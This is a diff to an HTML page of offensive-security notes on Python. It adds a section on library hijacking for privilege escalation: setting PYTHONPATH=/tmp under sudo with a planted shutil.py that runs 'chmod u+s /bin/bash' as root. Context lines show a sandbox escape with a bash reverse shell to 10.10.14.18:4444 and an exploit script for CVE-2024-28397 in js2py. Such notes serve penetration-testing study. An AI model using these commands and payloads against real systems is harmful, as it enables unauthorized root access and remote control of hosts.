@@ -23,7 +23,21 @@
             <p>Programming language</p>
         </div>
         <div class="notion-body">
+
+            <h2>Library Hijacking</h2>
+            <ul>
+                <p>This method is very similar to path hijacking but you must need the SETENV privilege (sudo -l) and any import of a library in python for example</p>
+                <pre><code class="language-python">from shutil import make_archive</code></pre>
+                <p>Since python acts like the Linux path in terms of looking for the libraries in the file system we can set <b>PYTHONPATH=/tmp</b> env variable to especify a new folder to look for libraries</p>
+                <p>Inside /tmp we will create our shutil.py malicious file which can contain any command which will be executed as root</p>    
+                <p>The execute the whole command as root providing the env variable and the malicious file will be executed. Example:</p>
+                <pre><code class="language-bash">#!/bin/bash
+chmod u+s /bin/bash</code></pre>
+                <pre><code class="language-python">sudo PYTHONPATH=/tmp ./admin_tasks.sh 6</code></pre>
+            </ul>
+
             <h2>Escape from restricted environment (Python IDE)</h2>
+            <ul>
             <p>In some cases you may find that you are in a python environment that ables you to run commands but not all of them. The current case was a python IDE that was web hosted, in that case you could try several things</p>
             <h3>Introductory</h3>
             <p>We could try some very basic way of executing commands. This is likely not work since there will be some restricted words</p>
@@ -68,7 +82,10 @@ cmd = ['bash', '-c', 'bash -i >& /dev/tcp/10.10.14.18/4444 0>&1']
 proc = cls(cmd, stdout=-1, stderr=-1)
 proc.communicate()</code></pre>    
             </ul>
+            </ul>
+
             <h2>Escape from restricted environment (JS IDE)</h2>
+            <ul>
             <p>In this case we are in an IDE environment but this time we can only code in JS.</p>
             <b>This can only be exploitable if the server where you run the code has imported a python library called <a class="notion-link">j2py</a></b>
             <h3>CVE-2024-28397</h3>
@@ -99,6 +116,7 @@ headers = {"Content-Type": "application/json"}
 r = requests.post(url, data=json.dumps(payload), headers=headers)  
 print(r.text)
 </code></pre>
+        </ul>
         </div>
     </div>
 
